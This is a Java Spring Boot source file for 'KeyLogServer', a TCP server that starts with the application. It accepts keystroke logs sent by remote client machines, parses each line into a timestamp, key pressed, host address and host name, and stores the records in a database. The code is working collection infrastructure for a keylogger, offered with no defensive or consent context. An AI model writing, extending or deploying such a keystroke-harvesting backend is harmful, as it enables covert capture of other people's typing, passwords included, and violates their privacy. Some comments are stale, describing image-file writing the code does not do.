package com.zpq;

import com.zpq.model.KeyListener;
import com.zpq.service.KeyListenerService;
import com.zpq.utils.PropertiesUtil;
import com.zpq.utils.SpringUtil;
import org.springframework.boot.ApplicationArguments;
import org.springframework.boot.ApplicationRunner;
import org.springframework.stereotype.Component;

import java.io.IOException;
import java.net.InetSocketAddress;
import java.nio.ByteBuffer;
import java.nio.channels.SelectionKey;
import java.nio.channels.Selector;
import java.nio.channels.ServerSocketChannel;
import java.nio.channels.SocketChannel;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.Iterator;
import java.util.Map;
import java.util.Set;

/**
 * 在Springboot启动类之前执行
 * 接收客户端的按键日志
 */
@Component
public class KeyLogServer implements ApplicationRunner {
    @Override
    public void run(ApplicationArguments args) throws Exception {
        new Thread(new KeyConfigServer()).start();
        Thread t = new Thread(new Server());
        t.start();
    }
}

class Server implements Runnable{

    private Selector selector;
    private volatile  boolean stop;
    private ServerSocketChannel server;
    private KeyListenerService keyListenerService;

    public Server(){
        try {
            keyListenerService = (KeyListenerService) SpringUtil.getBean("keyListenerService");
            selector = Selector.open();
            server = ServerSocketChannel.open();
            server.configureBlocking(false);
            //从配置文件中 获取监听端口端口
            Map<String, String> map = PropertiesUtil.getMap("keyServer");
            server.socket().bind(new InetSocketAddress(Integer.parseInt(map.get("keyLogPort"))),1024);
            server.register(selector,SelectionKey.OP_ACCEPT);
            System.out.println("TCP服务端启动啦");
        } catch (IOException e) {
            e.printStackTrace();
            System.exit(1);
        }
    }

    public void stop() {
        stop = true;
    }

    @Override
    public void run() {
        while (!stop) {
            try {
                //休眠1秒  无论是否有读写事件发生 selector每隔1秒被唤醒
                selector.select(1000);
                //获取注册在selector上的所有的就绪状态的serverSocketChannel中发生的事件
                Set<SelectionKey> selectedKeys = selector.selectedKeys();
                Iterator<SelectionKey> iterators = selectedKeys.iterator();
                SelectionKey key = null;
                while (iterators.hasNext()) {
                    key = iterators.next();
                    iterators.remove();
                    try {
                        handleInput(key);
                    } catch (Exception e) {
                        if (key != null) {
                            key.cancel();
                            if (key.channel() != null) {
                                key.channel().close();
                            }
                        }
                    }
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        if (selector != null) { //服务停止 关闭selector
            try {
                selector.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    /**
     * 处理客户端新接入的请求
     * @param key 请求信息
     * @throws IOException
     */
    private void handleInput(SelectionKey key){
        if(key.isValid()){
            if(key.isAcceptable()){
                try {
                    ServerSocketChannel ssc = (ServerSocketChannel) key.channel();
                    SocketChannel sc = ssc.accept();
                    sc.configureBlocking(false);
                    sc.register(selector,SelectionKey.OP_READ);
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }

            if(key.isReadable()){
                SocketChannel client = null;
                try {
                    //读事件就绪
                    //9.获取当前选择器就绪状态的通道
                    client = (SocketChannel)key.channel();
                    //9.1读取数据
                    ByteBuffer buffer = ByteBuffer.allocate(1024*1024);
                    //9.2得到文件通道,将客户端传递过来的图片写到本地项目下(写模式,没有则创建)
                    while(client.read(buffer)>0){
                        //在读之前都要切换成读模式
                        buffer.flip();
                        String data = new String(buffer.array(), 0, buffer.limit());
                        String[] logs = data.split("\n");
                        System.out.println("==============接收数据==============");
                        for (String log : logs) {
                            KeyListener keyListener = new KeyListener();
                            keyListener.setCreateDate(new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").parse(log.split("\\|")[0]));
                            keyListener.setKeyName(log.split("\\|")[1]);
                            keyListener.setHostAddress(log.split("\\|")[2]);
                            keyListener.setHostName(log.split("\\|")[3]);
                            System.out.println(keyListener);
                            keyListenerService.save(keyListener);
                        }
                        //outChannel.write(buffer);
                        System.out.println("==============接收完毕==============");
                        //读完切换成写模式,能让管道继续读取文件的数据
                        buffer.clear();
                    }
                } catch (IOException e) {
                    System.out.println("远程主机强迫关闭了一个现有的连接,5秒后重启线程OvO");
                    key.cancel();
                    try {
                        client.close();
                    } catch (IOException ex) {
                        ex.printStackTrace();
                    }
                } catch (ParseException e) {
                    e.printStackTrace();
                }
            }
        }
    }
}
